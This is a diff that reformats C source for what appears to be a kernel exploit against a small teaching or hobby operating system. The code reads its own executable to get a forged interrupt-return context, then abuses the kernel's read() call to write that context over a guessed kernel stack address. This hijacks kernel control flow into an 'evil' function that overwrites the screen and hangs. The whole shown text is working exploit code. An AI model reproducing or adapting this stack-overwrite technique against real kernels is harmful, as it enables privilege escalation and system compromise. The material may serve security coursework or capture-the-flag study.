@@ -30,33 +30,39 @@ static const char *art = "\
                                                                                 \n\
                                                                                 \n";
 
-static void kernel_clear(uint8_t attrib) {
+static void
+kernel_clear(uint8_t attrib)
+{
     char *screen = (char *)0xB8000;
-    int32_t count = 2048; /* Yes, just like that game. */
+   int count = 2048; /* Yes, just like that game. */
     while (count-- > 0) {
         *screen++ = ' ';
         *screen++ = attrib;
     }
 }
 
-static void kernel_draw(const char *art) {
+static void
+kernel_draw(const char *art)
+{
     char *screen = (char *)0xB8000;
     const char *s = art;
-    int32_t x = 0;
-    int32_t y = 0;
+    int x = 0;
+    int y = 0;
     for (; *s; ++s) {
         if (*s == '\n') {
             x = 0;
             y++;
         } else {
-            int32_t offset = (y * 80 + x) * 2;
+            int offset = (y * 80 + x) * 2;
             screen[offset] = *s;
             x++;
         }
     }
 }
 
-static void evil(void) {
+static void
+evil(void)
+{
     kernel_clear(0x1F);
     kernel_draw(art);
     while (1);
@@ -72,12 +78,14 @@ static uint32_t iret_context[5] = {
     (uint32_t)0x18,      /* SS (kernel) */
 };
 
-static void try_patch_kernel(uint32_t addr) {
+static void
+try_patch_kernel(uint32_t addr)
+{
     /* Now that's what I call reflection! */
-    int32_t fd = open("wtf");
+    int fd = open("wtf");
 
     /* Skip until we hit the correct offset */
-    int32_t offset = (uint32_t)&iret_context[0] - 0x8048000;
+    int offset = (uint32_t)&iret_context[0] - 0x8048000;
     while (offset-- > 0) {
         char dummy;
         read(fd, &dummy, 1);
@@ -89,7 +97,7 @@ static void try_patch_kernel(uint32_t addr) {
      * return from the read; it should directly jump
      * to the evil function.
      */
-    int32_t count = read(fd, (void *)(addr - sizeof(iret_context)), sizeof(iret_context));
+    int count = read(fd, (void *)(addr - sizeof(iret_context)), sizeof(iret_context));
     if (count == sizeof(iret_context)) {
         printf("[-] Patch at %x FAIL, wrong kernel stack\n", addr);
     } else {
@@ -100,7 +108,9 @@ static void try_patch_kernel(uint32_t addr) {
     close(fd);
 }
 
-int32_t main(void) {
+int
+main(void)
+{
     /*
      * This would be a lot easier with a kernel stack
      * address leak, but since we don't have a reliable
